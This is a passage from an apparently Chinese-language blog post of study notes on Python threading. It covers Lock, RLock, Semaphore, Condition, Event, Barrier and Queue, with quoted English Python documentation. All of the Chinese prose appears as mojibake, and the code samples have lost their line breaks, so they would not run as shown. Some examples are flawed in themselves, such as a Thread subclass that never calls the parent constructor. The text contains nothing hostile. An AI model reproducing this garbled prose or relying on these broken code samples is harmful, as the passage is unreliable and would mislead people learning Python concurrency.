å®šä¹‰çº¿ç¨‹å­ç±»</h2><p>ç»å¸¸ä¼šç»§æ‰¿threadingæ¨¡å—çš„Threadç±»æ¥è¿›è¡Œç»§æ‰¿å’Œé‡å†™ã€‚å®˜æ–¹æ–‡æ¡£è¯´äº†åªèƒ½é‡å†™<code>___init__</code>å’Œ<code>run</code>æ–¹æ³• ä¸¾ä¸ªä¾‹å­</p><pre><code class="python">from threading import Threadclass ThreadNew(Thread):    def __init__(self,name):        self.name = name        def run(self):        print(f&#39;My name is &#123;self.name&#125;&#39;)</code></pre><p>è¿™ä¸ªåŸºæœ¬åŸç†å°±æ˜¯ç»§æ‰¿äº†Threadç±»çš„initå‚æ•°ï¼Œä½†æ˜¯æˆ‘è‡ªå·±åˆå®šä¹‰äº†é¢å¤–å‚æ•°ã€‚çº¿ç¨‹ä»ready-&gt;runningçŠ¶æ€æ”¹å˜æ—¶ã€‚å®é™…ä¸Šå°±æ˜¯å†ç»é‡Œæˆ‘ä»¬è¿™ä¸ªè‡ªå®šä¹‰ç±»çš„<code>___init__</code>å’Œ<code>run</code>æ–¹æ³•ã€‚</p><h2 id="2-5-1-å…³äºThread-start-å’ŒThread-join"><a href="#2-5-1-å…³äºThread-start-å’ŒThread-join" class="headerlink" title="2-5-1 å…³äºThread.start()å’ŒThread.join()"></a>2-5-1 å…³äºThread.start()å’ŒThread.join()</h2><p>startæ–¹æ³•æ˜¯ä¸é˜»å¡çš„ï¼Œå‡å¦‚ä½ æŠŠä¸€å †çº¿ç¨‹startå®Œäº†ï¼Œå†æŒ¨ä¸ªå»joinã€‚é‚£ä¹ˆçº¿ç¨‹æ‰§è¡Œrunningé¡ºåºå¯èƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ˜æ˜ä½ ç¬¬ä¸€ä¸ªstartçš„çº¿ç¨‹å¯èƒ½å¹¶ä¸æ˜¯ç¬¬ä¸€ä¸ªè·‘èµ·æ¥çš„ã€‚è‡³äºjoinæ–¹æ³•</p><p>å®˜æ–¹æ˜¯è¿™ä¹ˆè¯´çš„</p><p><code>join(timeout=None)</code></p><p><code>Wait until the thread terminates. This blocks the calling thread until the thread whose joinmethod is called terminates â€“ either normally or through an unhandled exception â€“ or until the optional timeout occurs.</code></p><p>è¯´ç™½äº†ï¼Œå‡å¦‚æˆ‘å¸Œæœ›æˆ‘çš„çº¿ç¨‹è¢«é¡ºåºæ‰§è¡Œï¼Œå°±æ˜¯startä¸€ä¸ªå…ˆè®©ä»–æ‰§è¡Œå®Œå†å»æ‰§è¡Œä¸‹ä¸€æ­¥ã€‚</p><h3 id="2-6-ä½¿ç”¨é”ï¼ˆLockï¼‰çš„çº¿ç¨‹åŒæ­¥"><a href="#2-6-ä½¿ç”¨é”ï¼ˆLockï¼‰çš„çº¿ç¨‹åŒæ­¥" class="headerlink" title="2-6 ä½¿ç”¨é”ï¼ˆLockï¼‰çš„çº¿ç¨‹åŒæ­¥"></a>2-6 ä½¿ç”¨é”ï¼ˆLockï¼‰çš„çº¿ç¨‹åŒæ­¥</h3><p>threadingæä¾›äº†ä¸€ä¸ªç®€å•çš„é”æœºåˆ¶ï¼Œå…è®¸åœ¨çº¿ç¨‹é—´å®ç°åŒæ­¥ã€‚</p><pre><code class="python">lock=threading.Lock()lock.acquire() # è¿”å›çœŸå¦‚æœæ‹¿åˆ°é”ï¼ŒåŸºæœ¬éƒ½ä¼šæ‹¿åˆ°ï¼Œå› ä¸ºæ‹¿ä¸åˆ°ä¹Ÿä¼šå»é˜»å¡ç­‰å¾…                 ä½†ä¹Ÿä¸ä¸€å®šï¼Œä½ å¦‚æœè®¾ç½®äº†éé˜»å¡æˆ–è€…timeoutå°±å¯èƒ½è¿”å›false                 å¦‚æœæ²¡è·å–æˆåŠŸacquire(blocking=True,timeout=-1) # é»˜è®¤-1å°±æ˜¯never</code></pre><p>è¿™ç§é”çš„ä¸€ä¸ªç®€å•åº”ç”¨å°±æ˜¯ï¼Œè®©çº¿ç¨‹èƒ½å¤Ÿé¡ºåºæ‰§è¡Œåœ¨é‡å†™çš„Threadç±»ä¸­çš„runæ–¹æ³•ä¸­å¼€å¤´åŠ ä¸€ä¸ª<code>lock.acquire()</code>è¿™æ ·åæ¥startçš„å°±ä¼šå› ä¸ºé”è¢«å ç”¨é˜»å¡è€Œç­‰å¾…ã€‚ç­‰runæ–¹æ³•ç»“æŸæ—¶å†<code>lock.release()</code>è®©ä¸‹ä¸€ä¸ªç»§ç»­runã€‚åªèƒ½ä¿è¯åœ¨é”çš„åŒºé—´ä¿æŒä¸€è‡´ï¼Œå¦‚æœåœ¨runæ–¹æ³•ç»“æŸå‰å°±é‡Šæ”¾é”ï¼Œé‚£ä¹ˆè¿™äº›è¿›ç¨‹å°½ç®¡å¯åŠ¨æ˜¯é¡ºåºå¯åŠ¨ï¼Œä½†æ˜¯ç»“æŸå°±ä¸ä¼šæ˜¯æŒ¨ä¸ªç»“æŸäº†ã€‚</p><h2 id="2-7-é‡å…¥é”ï¼ˆRLockï¼‰"><a href="#2-7-é‡å…¥é”ï¼ˆRLockï¼‰" class="headerlink" title="2-7 é‡å…¥é”ï¼ˆRLockï¼‰"></a>2-7 é‡å…¥é”ï¼ˆRLockï¼‰</h2><p>é‡å…¥é”æ˜¯ä¸€ä¸ªåŒæ­¥åŸè¯­ï¼ˆsynchronization primitivesï¼‰å¬èµ·æ¥æœ‰ç‚¹é«˜å¤§ä¸Šï¼Œç™¾åº¦ç™¾ç§‘çœŸçš„æ‹‰è·¨æœéƒ½æœä¸åˆ°è¿™ä¸ªä¸œè¥¿ã€‚åœ¨å›½å¤–StackOverFlowæ‰¾åˆ°è§£é‡Š</p><p><code>Synchronization primitives are simple software mechanisms provided by a platform (e.g. operating system) to its users for the purposes of  supporting thread or process synchronization. They&#39;re usually built  using lower level mechanisms (e.g. atomic operations, memory barriers,  spinlocks, context switches etc).</code></p><p><code>Mutex, event, conditional variables and semaphores are all  synchronization primitives. So are shared and exclusive locks. Monitor  is generally considered a high-level synchronization tool. It&#39;s an  object which guarantees mutual exclusion for its methods using other  synchronization primitives (usually exclusive locks with condition  variables to support waiting and signaling). In some contexts when  monitor is used as a building block it is also considered a  synchronization primitive.</code></p><p><code>Critical section is not a synchronization primitive. It&#39;s a part of  an execution path that must be protected from concurrent execution in  order to maintain some invariants. You need to use some synchronization  primitives to protect critical section.</code></p><p>é¦–å…ˆå§ï¼ŒåŒæ­¥åŸè¯­æ˜¯ä¸€ç§ç”±å¹³å°æä¾›çš„è½¯ä»¶æœºåˆ¶ï¼Œç”¨æ¥å¹²å˜›çš„ï¼Ÿç”¨æ¥åŒæ­¥è¿›ç¨‹å’Œçº¿ç¨‹ã€‚ä»–ä»¬é€šå¸¸æ˜¯ç”±æ›´åŠ åº•å±‚çš„æœºåˆ¶æ„å»ºçš„(ä¾‹å¦‚åŸå­æ“ä½œï¼Œå†…å­˜å±éšœï¼Œæ—‹è½¬é”ï¼Œä¸Šä¸‹æ–‡åˆ‡æ¢ç­‰)</p><p>äº’æ–¥é”ï¼Œäº‹ä»¶ï¼Œæ¡ä»¶å˜é‡å’Œä¿¡å·é‡éƒ½æ˜¯åŒæ­¥åŸè¯­ã€‚åŒæ—¶å…±äº«å’Œæ’æ–¥é”ä¹Ÿæ˜¯çš„ã€‚Monitorï¼ˆä¸çŸ¥é“å’‹ç¿»è¯‘ï¼‰é€šå¸¸è¢«è®¤ä¸ºæ˜¯ä¸€ç§æ›´é«˜å±‚é¢çš„åŒæ­¥å·¥å…·ã€‚ã€‚ã€‚ã€‚ï¼ˆåé¢è¿˜ä¸å¤ªæ‡‚ï¼Œå…ˆä¸ç®¡äº†ï¼‰</p><p>P.S.è¿™ä¹¦å†™çš„å…¶å®è¿˜ä¸ç®—å¤ªå‹å¥½ï¼ŒPythonè¯­æ³•å€’æ˜¯è®²çš„å¾ˆç»†ï¼Œå¯¹äºPythonåˆå­¦è€…èƒ½çœ‹æ‡‚ã€‚ä½†æ˜¯å¯¹äºè¿™ç§å¹¶è¡Œæ¦‚å¿µå’ŒåŸç†èƒŒæ™¯èƒ½å†ä»‹ç»çš„è¯¦ç»†ç‚¹å°±å¥½äº† ã€‚</p><p>çœ‹ä¸‹å®˜ç½‘çš„ä»‹ç»ï¼š</p><pre><code>A reentrant lock is a synchronization primitive that may be acquired multiple times by the same thread. Internally, it uses the concepts of â€œowning threadâ€ and â€œrecursion levelâ€ in addition to the locked/unlocked state used by primitive locks. In the locked state, some thread owns the lock; in the unlocked state, no thread owns it.To lock the lock, a thread calls its acquire() method; this returns once the thread owns the lock. To unlock the lock, a thread calls its release() method. acquire()/release() call pairs may be nested; only the final release() (the release() of the outermost pair) resets the lock to unlocked and allows another thread blocked in acquire() to proceed.</code></pre><p>å¯¹æ¯”äºthreadingé‡Œçš„Lockä¸éš¾çœ‹å‡ºå®ƒçš„ä¸»è¦ç‰¹ç‚¹æ˜¯å¯ä»¥è¢«åŒä¸€çº¿ç¨‹å¤šæ¬¡è·å–ï¼Œä½†ä¹Ÿéœ€è¦å¤šæ¬¡è§£é”ã€‚<code>åŒæ—¶é‡å…¥é”è¿˜æœ‰ä¸ªç‰¹ç‚¹å°±æ˜¯åªèƒ½ç”±è·å–é”çš„çº¿ç¨‹æ¥é‡Šæ”¾ï¼Œè€Œæ™®é€šçš„Lockåˆ™å¯ä»¥ç”±ä»»æ„çº¿ç¨‹é‡Šæ”¾</code> çœ‹åˆ°è¿™é‡Œå…¶å®æˆ‘è¿˜æ˜¯è§‰å¾—è¿™ç©æ„å’ŒLockæ²¡å•¥åŒºåˆ«ï¼Œç›´åˆ°æˆ‘çœ‹äº†ä¹¦ä¸Šçš„ä¾‹ç¨‹</p><pre><code class="python">import threadingimport timeimport randomclass Box:    def __init__(self):        self.lock = threading.RLock()        self.total_items = 0    def execute(self, value):        with self.lock:            self.total_items += value    def add(self):        with self.lock:            self.execute(1)    def remove(self):        with self.lock:            self.execute(-1)def adder(box, items):    print(&quot;NÂ° &#123;&#125; items to ADD \n&quot;.format(items))    while items:        box.add()        time.sleep(1)        items -= 1        print(&quot;ADDED one item --&gt;&#123;&#125; item to ADD \n&quot;.format(items))def remover(box, items):    print(&quot;NÂ° &#123;&#125; items to REMOVE \n&quot;.format(items))    while items:        box.remove()        time.sleep(1)        items -= 1        print(&quot;REMOVED one item --&gt;&#123;&#125; item to REMOVE \n&quot;.format(items))def main():    box = Box()    t1 = threading.Thread(target=adder, \                          args=(box, random.randint(10,20)))    t2 = threading.Thread(target=remover, \                          args=(box, random.randint(1,10)))        t1.start()    t2.start()    t1.join()    t2.join()    if __name__ == &quot;__main__&quot;:    main()</code></pre><p>æ¥åˆ†æä¸€ä¸‹å®ä¾‹åŒ–äº†ä¸€ä¸ªBoxç±»ï¼Œè¿™ä¸ªç±»é‡Œæœ‰ç‰©å“æ•°é‡é»˜è®¤æ˜¯0ï¼Œç‰©å“æ•°é‡çš„å¢å‡é€šè¿‡å†…éƒ¨<code>add</code>å’Œ<code>remove</code>æ–¹æ³•æ§åˆ¶ï¼Œè¿™ä¿©æ–¹æ³•é—´æ¥è°ƒç”¨<code>execute</code>æ¥å¯¹å®ä¾‹å˜é‡itemè¿›è¡Œæ“ä½œã€‚è¿™é‡Œå¼€äº†ä¸¤ä¸ªçº¿ç¨‹ä¸€ä¸ªæ˜¯åŠ 10-20ï¼Œå¦ä¸€ä¸ªæ˜¯å‡1-10ã€‚åœ¨æ¯æ¬¡åŠ å‡æ—¶ï¼Œå…ˆå›æŠŠæ–¹æ³•ç»™é”ä½ï¼Œå°±æ˜¯è¯´å‡å¦‚æˆ‘å¼€å§‹åŠ äº†ï¼Œé‚£ä¹ˆå‡æ–¹æ³•å°±ä¼šä¸€ç›´è¢«é”ï¼Œæ¯æ¬¡æ‰§è¡Œå¢å‡æ—¶ä¹Ÿä¼šè·å–ä¸€ä¸ªé”ã€‚å¢å‡å®Œå†ä¸€æ­¥æ­¥é‡Šæ”¾ã€‚</p><h3 id="2-8-ä¿¡å·é‡ï¼ˆsemaphoreï¼‰"><a href="#2-8-ä¿¡å·é‡ï¼ˆsemaphoreï¼‰" class="headerlink" title="2-8 ä¿¡å·é‡ï¼ˆsemaphoreï¼‰"></a>2-8 ä¿¡å·é‡ï¼ˆsemaphoreï¼‰</h3><p>ä¿¡å·é‡æ˜¯ä¸€ä¸ªç”±æ“ä½œç³»ç»Ÿç®¡ç†çš„æŠ½è±¡<code>æ•°æ®ç±»å‹</code>ï¼Œç”¨æ¥åŒæ­¥å¤šä¸ªçº¿ç¨‹å¯¹å…±äº«èµ„æºå’Œæ•°æ®çš„è®¿é—®ã€‚ä¿¡å·é‡åŒ…æ‹¬ä¸€ä¸ªå†…éƒ¨å˜é‡ï¼Œä¼šæ ‡è¯†å¯¹å…³è”èµ„æºçš„å¹¶å‘è®¿é—®æ•°ã€‚</p><p>å…·ä½“ä½¿ç”¨</p><pre><code class="python">semaphore = threading.Semaphore(0) # åˆå§‹åŒ–ä¿¡å·é‡å†…éƒ¨è®¡æ•° é»˜è®¤æ˜¯1 å°†å…¶åˆå§‹å€¼è®¾ä¸º0å¾—åˆ°ä¿¡å·é‡äº‹ä»¶semaphore.acquire() # å†…éƒ¨è®¡æ•°å‡1semaphore.release() # å†…éƒ¨è®¡æ•°åŠ 1</code></pre><p>The <code>acquire()</code>method blocks if necessary until it can return without making the counter negative. If not given, <em>value</em> defaults to 1.ä¹Ÿå°±æ˜¯å½“è®¡æ•°å™¨ä¸º0æ—¶å¿…é¡»å…ˆè¢«releaseæ‰èƒ½å†require</p><p>ä¸¾ä¸ªå®é™…çš„ä¾‹å­å§ï¼ˆæŠ„çš„python docçš„æ ·ä¾‹æˆ‘è§‰å¾—å¾ˆæœ‰ä»£è¡¨æ€§ï¼‰</p><p><code>Semaphores are often used to guard resources with limited capacity, for example, a database server. In any situation where the size of the resource is fixed, you should use a bounded semaphore. Before spawning any worker threads, your main thread would initialize the semaphore:</code></p><pre><code>maxconnections = 5# ...pool_sema = BoundedSemaphore(value=maxconnections)Once spawned, worker threads call the semaphoreâ€™s acquire and release methods when they need to connect to the server:with pool_sema:    conn = connectdb()    try:        # ... use connection ...    finally:        conn.close()The use of a bounded semaphore reduces the chance that a programming error which causes the semaphore to be released more than itâ€™s acquired will go undetected.</code></pre><p>å°±æ˜¯æ§åˆ¶æ•°æ®åº“çš„æœ€å¤§é“¾æ¥é‡</p><p>è¿™é‡Œæ˜¯ç”¨çš„Bounded Semaphore,å…¶å®è¿˜æ˜¯æ¢æ±¤ä¸æ¢è¯ã€‚</p><ul><li><p><em>class</em> <code>threading.``BoundedSemaphore</code>(<em>value=1</em>)</p><p>Class implementing bounded semaphore objects.  A bounded semaphore checks to make sure its current value doesnâ€™t exceed its initial value.  If it does, <a href="https://docs.python.org/3/library/exceptions.html#ValueError"><code>ValueError</code></a> is raised. In most situations semaphores are used to guard resources with limited capacity.  If the semaphore is released too many times itâ€™s a sign of a bug.  If not given, <em>value</em> defaults to 1. Changed in version 3.3: changed from a factory function to a class.</p><p>è¯´ç™½äº†å°±æ˜¯åŠ äº†ä¸ªå†…éƒ¨æ£€æµ‹æœºåˆ¶ï¼Œå½“ä¿¡å·é‡è®¡æ•°å™¨çš„å€¼å§‹ç»ˆä¸ä¼šè¶…è¿‡å…¶åˆå§‹å€¼ã€‚ï¼ˆå…¶å®ä½ ç”¨çš„æ­£ç¡®ä¹Ÿä¸ä¼šæœ‰è¿™ç§æƒ…å†µï¼‰ä½†æ˜¯å› ä¸ºé»˜è®¤çš„Semaphoreæ˜¯æ²¡æ³•ç›´è§‚çœ‹åˆ°è®¡æ•°å™¨å€¼ï¼Œæ‰€ä»¥ç”¨è¿™ä¸ªBounded Semaphoreå¯ä»¥é¿å…ä¸€äº›æ„æ–™å¤–çš„é”™è¯¯ã€‚</p></li></ul><p>ä¿¡å·é‡è¿˜æœ‰ç§ç‰¹æ®Šç”¨æ³•å°±æ˜¯äº’æ–¥é”ã€‚äº’æ–¥é”å°±æ˜¯å†…éƒ¨å˜é‡åˆå§‹åŒ–ä¸º1çš„ä¸€ä¸ªä¿¡å·é‡ï¼ˆæœ€å¥½æ˜¯BoundedSemaphoreï¼‰ï¼Œå¯ä»¥å®ç°å¯¹æ•°æ®å’Œèµ„æºçš„äº’æ–¥è®¿é—®ã€‚</p><p>ä¿¡å·é‡åœ¨å¤šçº¿ç¨‹ç¼–ç¨‹è¯­è¨€ä¸­ä»å¾ˆå¸¸ç”¨ä½†æœ‰ä¿©ä¸»è¦é—®é¢˜</p><ul><li>é‡Šæ”¾æ“ä½œæ•°è¦ä¸ç­‰å¾…æ“ä½œä¸Šç›¸åŒ</li><li>å¯èƒ½é‡åˆ°æ­»é”æƒ…å†µ</li></ul><h2 id="2-9-ä½¿ç”¨æ¡ä»¶çš„çº¿ç¨‹åŒæ­¥"><a href="#2-9-ä½¿ç”¨æ¡ä»¶çš„çº¿ç¨‹åŒæ­¥" class="headerlink" title="2.9 ä½¿ç”¨æ¡ä»¶çš„çº¿ç¨‹åŒæ­¥"></a>2.9 ä½¿ç”¨æ¡ä»¶çš„çº¿ç¨‹åŒæ­¥</h2><p>ä½¿ç”¨æ¡ä»¶æ¥è¿›è¡Œçº¿ç¨‹åŒæ­¥çš„åŸç†ï¼Œç±»ä¼¼äºsocketé€šä¿¡ã€‚å½“ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨<code>condition.wait()</code>æ¥è¿›è¡Œé˜»å¡ï¼Œå½“å¦ä¸€ä¸ªçº¿ç¨‹å‘å‡º<code>condition.notify()æˆ–è€…æ˜¯condition.notify_all()</code>å¦ä¸€ä¸ªåŸæœ¬é˜»å¡çš„çº¿ç¨‹ä¾¿ä¼šç»§ç»­è¿è¡Œã€‚åŒæ—¶conditionåœ¨åˆå§‹åŒ–æ—¶å¦‚æœæ²¡æœ‰ä¼ å…¥é”ï¼Œé‚£ä¹ˆä¼šé»˜è®¤åˆ›å»ºä¸€ä¸ª<code>RLock</code>ã€‚å½“ä¸€ä¸ªçº¿ç¨‹å¯¹å…±äº«çš„çŠ¶æ€æ•°æ®æœ‰ä¾èµ–æ—¶ï¼Œå¾€å¾€å°±ä¼šç”¨conditionæ¥è¿›è¡ŒåŒæ­¥ã€‚å¦‚æœè¿™ä¸ªçŠ¶æ€è¢«å¦ä¸€ä¸ªçº¿ç¨‹æ”¹å˜ï¼Œå¹¶è°ƒç”¨notifyï¼Œé‚£ä¹ˆä»–å°±ä¼šç»§ç»­è¿è¡Œå¹¶æ£€æµ‹æ˜¯å¦çŠ¶æ€æ˜¯idealçš„ã€‚è¿™ä¸ªè¿‡ç¨‹å¯ä»¥è¿™æ ·è¡¨ç¤º</p><pre><code class="python">status=&#39;sleep&#39;def consumer():    with condition:        if status!=&#39;ideal&#39;:            condition.wait()            consumer()        else:            print(&#39;Success&#39;)        def produce():            with condition:        status=&#39;ideal&#39;        condition.notify()</code></pre><p>åŒæ—¶ç”±äºwithå­˜åœ¨ï¼Œæ‰€ä»¥è¯´åœ¨notifyååœ¨waitçš„çº¿ç¨‹åä¸ä¼šç«‹åˆ»è¢«å”¤é†’ã€‚è¿™æ˜¯å› ä¸ºè°ƒç”¨notifyçš„çº¿ç¨‹è¿˜æ²¡æœ‰é‡Šæ”¾é”ã€‚å¾…å…¶çº¿ç¨‹æ‰§è¡Œå®Œæ¯•ï¼Œé”è¢«é‡Šæ”¾ï¼Œç­‰å¾…çš„çº¿ç¨‹æ‰ä¼šç»§ç»­è¿è¡Œã€‚</p><p>åŒæ—¶æ­¤å¤„çš„çŠ¶æ€æ£€æŸ¥ä¹Ÿå¯ä»¥ä½¿ç”¨æ¡ä»¶å˜é‡çš„<code>condition.wait_for()</code>æ¥è¿›è¡ŒçŠ¶æ€æ£€æµ‹</p><h2 id="2-10-ä½¿ç”¨äº‹ä»¶çš„çº¿ç¨‹åŒæ­¥"><a href="#2-10-ä½¿ç”¨äº‹ä»¶çš„çº¿ç¨‹åŒæ­¥" class="headerlink" title="2.10 ä½¿ç”¨äº‹ä»¶çš„çº¿ç¨‹åŒæ­¥"></a>2.10 ä½¿ç”¨äº‹ä»¶çš„çº¿ç¨‹åŒæ­¥</h2><p>äº‹ä»¶æ˜¯ç”¨äºçº¿ç¨‹é—´é€šä¿¡çš„ä¸€ä¸ªå¯¹è±¡ã€‚ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…ä¸€ä¸ªä¿¡å·ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹è¾“å‡ºè¿™ä¸ªä¿¡å·ï¼Œè¿›æœ¬æ¥è¯´eventå¯¹è±¡ç®¡ç†çš„ä¸€ä¸ªå†…éƒ¨æ ‡å¿—ï¼Œè¿™ä¸ªå¯ä»¥ç”¨clear()è®¾ç½®ä¸ºfalseï¼Œç”¨set()è®¾ç½®ä¸ºTrueï¼Œè¿˜å¯ç”¨is_set()æµ‹è¯•</p><p>çº¿ç¨‹å¯ä»¥é€šè¿‡wait()æ–¹æ³•ç­‰å¾…ä¸€ä¸ªä¿¡å·ï¼Œç”¨set()æ–¹æ³•å‘é€ä¿¡å·ã€‚è¿™ä¸ªæ¯”è¾ƒç®€å•ç›´æ¥çœ‹doc</p><pre><code>This is one of the simplest mechanisms for communication between threads: one thread signals an event and other threads wait for it.An event object manages an internal flag that can be set to true with the set() method and reset to false with the clear() method. The wait() method blocks until the flag is true.class threading.Event    Class implementing event objects. An event manages a flag that can be set to true with the set() method and reset to false with the clear() method. The wait() method blocks until the flag is true. The flag is initially false.    Changed in version 3.3: changed from a factory function to a class.    is_set()        Return True if and only if the internal flag is true.    set()        Set the internal flag to true. All threads waiting for it to become true are awakened. Threads that call wait() once the flag is true will not block at all.    clear()        Reset the internal flag to false. Subsequently, threads calling wait() will block until set() is called to set the internal flag to true again.    wait(timeout=None)        Block until the internal flag is true. If the internal flag is true on entry, return immediately. Otherwise, block until another thread calls set() to set the flag to true, or until the optional timeout occurs.        When the timeout argument is present and not None, it should be a floating point number specifying a timeout for the operation in seconds (or fractions thereof).        This method returns True if and only if the internal flag has been set to true, either before the wait call or after the wait starts, so it will always return True except if a timeout is given and the operation times out.</code></pre><h2 id="2-11-ä½¿ç”¨å±éšœçš„äº‹ä»¶åŒæ­¥"><a href="#2-11-ä½¿ç”¨å±éšœçš„äº‹ä»¶åŒæ­¥" class="headerlink" title="2.11 ä½¿ç”¨å±éšœçš„äº‹ä»¶åŒæ­¥"></a>2.11 ä½¿ç”¨å±éšœçš„äº‹ä»¶åŒæ­¥</h2><p>æœ‰æ—¶ï¼Œä¸€ä¸ªåº”ç”¨å¯ä»¥åˆ’åˆ†ä¸ºå¤šä¸ªé˜¶æ®µï¼Œå…¶è§„åˆ™æ˜¯ï¼šå¦‚æœä¸€ä¸ªè¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹æ²¡æœ‰å…¨éƒ¨å®Œæˆä»–ä»¬çš„ä»»åŠ¡ï¼Œè¿›ç¨‹å°±ä¸èƒ½ç»§ç»­ã€‚å±éšœï¼ˆBarrierï¼‰å®ç°äº†è¿™ä¸€æ¦‚å¿µï¼šå¦‚æœä¸€ä¸ªçº¿ç¨‹å®Œæˆäº†å®ƒçš„é˜¶æ®µï¼Œä¼šè°ƒç”¨ä¸€ä¸ªå±éšœåŸè¯­å¹¶åœæ­¢ã€‚æ¶‰åŠçš„æ‰€æœ‰çº¿ç¨‹éƒ½å®Œæˆå…¶æ‰§è¡Œé˜¶æ®µè€Œä¸”éƒ½è°ƒç”¨äº†åŒæ­¥åŸè¯­æ—¶ï¼Œç³»ç»Ÿå°†ä»–ä»¬å…¨éƒ¨è§£é”å¹¶è¿›å…¥ä¸‹ä¸€é˜¶æ®µã€‚</p><p>çœ‹ä¸‹å®˜æ–¹æ–‡æ¡£</p><pre><code>This class provides a simple synchronization primitive for use by a fixed number of threads that need to wait for each other. Each of the threads tries to pass the barrier by calling the wait() method and will block until all of the threads have made their wait() calls. At this point, the threads are released simultaneously.The barrier can be reused any number of times for the same number of threads.As an example, here is a simple way to synchronize a client and server thread:b = Barrier(2, timeout=5)def server():    start_server()    b.wait()    while True:        connection = accept_connection()        process_server_connection(connection)def client():    b.wait()    while True:        connection = make_connection()        process_client_connection(connection)class threading.Barrier(parties, action=None, timeout=None)    Create a barrier object for parties number of threads. An action, when provided, is a callable to be called by one of the threads when they are released. timeout is the default timeout value if none is specified for the wait() method.    wait(timeout=None)        Pass the barrier. When all the threads party to the barrier have called this function, they are all released simultaneously. If a timeout is provided, it is used in preference to any that was supplied to the class constructor.        The return value is an integer in the range 0 to parties â€“ 1, different for each thread. This can be used to select a thread to do some special housekeeping, e.g.:        i = barrier.wait()        if i == 0:            # Only one thread needs to print this            print(&quot;passed the barrier&quot;)        If an action was provided to the constructor, one of the threads will have called it prior to being released. Should this call raise an error, the barrier is put into the broken state.        If the call times out, the barrier is put into the broken state.        This method may raise a BrokenBarrierError exception if the barrier is broken or reset while a thread is waiting.    reset()        Return the barrier to the default, empty state. Any threads waiting on it will receive the BrokenBarrierError exception.        Note that using this function may require some external synchronization if there are other threads whose state is unknown. If a barrier is broken it may be better to just leave it and create a new one.    abort()        Put the barrier into a broken state. This causes any active or future calls to wait() to fail with the BrokenBarrierError. Use this for example if one of the threads needs to abort, to avoid deadlocking the application.        It may be preferable to simply create the barrier with a sensible timeout value to automatically guard against one of the threads going awry.    parties        The number of threads required to pass the barrier.    n_waiting        The number of threads currently waiting in the barrier.    broken        A boolean that is True if the barrier is in the broken state.exception threading.BrokenBarrierError    This exception, a subclass of RuntimeError, is raised when the Barrier object is reset or broken.</code></pre><p>å®˜æ–¹æ ·ä¾‹ä»£ç å°±æ˜¯ä¿è¯æœåŠ¡ç«¯å¯åŠ¨ï¼Œå®¢æˆ·ç«¯æ‰èƒ½ç»§ç»­æ¥ä¸‹æ¥çš„åŠ¨ä½œã€‚å†çœ‹ä¸‹ä¹¦ä¸Šçš„ä»£ç ã€‚</p><pre><code class="python">from random import randrangefrom threading import Barrier, Threadfrom time import ctime, sleepnum_runners = 3finish_line = Barrier(num_runners)runners = [&#39;Huey&#39;, &#39;Dewey&#39;, &#39;Louie&#39;]def runner():    name = runners.pop()    sleep(randrange(2, 5))    print(&#39;%s reached the barrier at: %s \n&#39; % (name, ctime()))    finish_line.wait()def main():    threads = []    print(&#39;START RACE!!!!&#39;)    for i in range(num_runners):        threads.append(Thread(target=runner))        threads[-1].start()    for thread in threads:        thread.join()    print(&#39;Race over!&#39;)if __name__ == &quot;__main__&quot;:    main()</code></pre><p>å¯åŠ¨äº†ä¸‰ä¸ªçº¿ç¨‹ï¼Œä»£è¡¨ä¸‰ä¸ªèµ›è·‘è€…ã€‚ä»–ä»¬ä¾æ¬¡åˆ°è¾¾ç»ˆç‚¹åï¼Œéƒ½è¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œç›´åˆ°ç­‰å¾…æ•°ä¸ºé€‰æ‰‹æ•°ï¼Œè¡¨æ˜éƒ½åˆ°äº†ç»ˆç‚¹ï¼Œmainå‡½æ•°ä»é˜»å¡ä¸­æ¢å¤ï¼Œæ‰“å°æ¯”èµ›ç»“æŸ</p><h2 id="2-12-ä½¿ç”¨é˜Ÿåˆ—çš„çº¿ç¨‹é€šè®¯"><a href="#2-12-ä½¿ç”¨é˜Ÿåˆ—çš„çº¿ç¨‹é€šè®¯" class="headerlink" title="2-12 ä½¿ç”¨é˜Ÿåˆ—çš„çº¿ç¨‹é€šè®¯"></a>2-12 ä½¿ç”¨é˜Ÿåˆ—çš„çº¿ç¨‹é€šè®¯</h2><p>çº¿ç¨‹éœ€è¦å…±äº«æ•°æ®å’Œèµ„æºæ—¶ï¼Œå¤šçº¿ç¨‹å¯èƒ½å¾ˆå¤æ‚ã€‚å¹¸è¿çš„æ˜¯threadingæ¨¡å—æä¾›äº†å¾ˆå¤šçš„åŒæ­¥åŸè¯­</p><p>åŒ…æ‹¬ä¿¡å·é‡ã€æ¡ä»¶å˜é‡ã€äº‹ä»¶å’Œé”ã€‚</p><p>ä¸è¿‡ä½¿ç”¨queueæ¨¡å—è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªæœ€å¯è¡Œçš„åŠæ³•ã€‚å®é™…ä¸Šå¤„ç†é˜Ÿåˆ—è¦å®¹æ˜“å¾—å¤šï¼Œè¿™ä½¿å¾—å¤šçº¿ç¨‹ç¼–ç¨‹æ›´åŠ å®‰å…¨ï¼Œå› ä¸ºå®ƒä¼šæœ‰æ•ˆçš„å°†å¯¹ä¸€ä¸ªèµ„æºçš„æ‰€æœ‰è®¿é—®æ’é˜Ÿï¼Œå®ç°ä¸€ç§æ›´ç®€ä»‹ã€å¯è¯»çš„è®¾è®¡æ¨¡å¼ã€‚</p><p>æˆ‘ä»¬åªéœ€è¦è€ƒè™‘å¦‚ä¸‹é˜Ÿåˆ—æ–¹æ³•ï¼š</p><ul><li>put():åœ¨é˜Ÿåˆ—ä¸­æ”¾å…¥ä¸€ä¸ªå…ƒç´ ã€‚</li><li>get():ä»é˜Ÿåˆ—åˆ é™¤å¹¶è¿”å›ä¸€ä¸ªå…ƒç´ ã€‚</li><li>task_done():æ¯æ¬¡å¤„ç†ä¸€ä¸ªå…ƒç´ æ—¶éœ€è¦è°ƒç”¨è¿™ä¸ªæ–¹æ³•</li><li>join():é˜»å¡ï¼Œç›´åˆ°æ‰€æœ‰å…ƒç´ éƒ½è¢«å¤„ç†</li></ul><p>The <a href="https://docs.python.org/3/library/queue.html#module-queue"><code>queue</code></a> module implements multi-producer, multi-consumer queues. It is especially useful in threaded programming when information must be exchanged safely between multiple threads.  The <a href="https://docs.python.org/3/library/queue.html#queue.Queue"><code>Queue</code></a> class in this module implements 